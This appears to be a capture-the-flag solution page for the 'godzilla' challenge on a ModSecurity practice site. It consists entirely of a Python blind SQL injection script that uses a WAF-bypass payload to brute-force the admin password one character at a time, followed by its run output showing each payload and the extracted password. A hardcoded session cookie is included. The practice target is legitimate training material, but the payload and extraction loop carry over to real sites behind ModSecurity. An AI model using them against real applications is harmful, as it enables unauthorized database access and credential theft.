---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 33
tags: [SQLi, Blind SQLi, MOD Security CRS, WAF bypass]
---

```python title="godzilla_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'p2aj4nltfvs8lji1sdmr3c2lam'}
url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php"
password_length = 0

for x in range(0, 10):
  payload = f"-1'<@=1 OR id='admin' AND length(pw)={x} OR '"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] Password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"-1'<@=1 OR id='admin' AND substr(pw, {index}, 1)='{char}' OR '"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\godzilla_script.py

[!] Payload: ?pw=-1'<@=1 OR id='admin' AND length(pw)=8 OR '
[!] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+length%28pw%29%3D8+OR+%27
[!] Password length: 8

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 1, 1)='a' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+1%2C+1%29%3D%27a%27+OR+%27
[+] Character at index 1: a

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 2, 1)='1' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+2%2C+1%29%3D%271%27+OR+%27
[+] Character at index 2: 1

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 3, 1)='8' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+3%2C+1%29%3D%278%27+OR+%27
[+] Character at index 3: 8

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 4, 1)='a' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+4%2C+1%29%3D%27a%27+OR+%27
[+] Character at index 4: a

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 5, 1)='6' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+5%2C+1%29%3D%276%27+OR+%27
[+] Character at index 5: 6

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 6, 1)='c' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+6%2C+1%29%3D%27c%27+OR+%27
[+] Character at index 6: c

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 7, 1)='c' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+7%2C+1%29%3D%27c%27+OR+%27
[+] Character at index 7: c

[+] Payload: ?pw=-1'<@=1 OR id='admin' AND substr(pw, 8, 1)='5' OR '
[+] Payload (URL encoded): ?pw=-1%27%3C%40%3D1+OR+id%3D%27admin%27+AND+substr%28pw%2C+8%2C+1%29%3D%275%27+OR+%27
[+] Character at index 8: 5

[!] Extracted password: a18a6cc5
[!] Final payload: ?pw=a18a6cc5
```
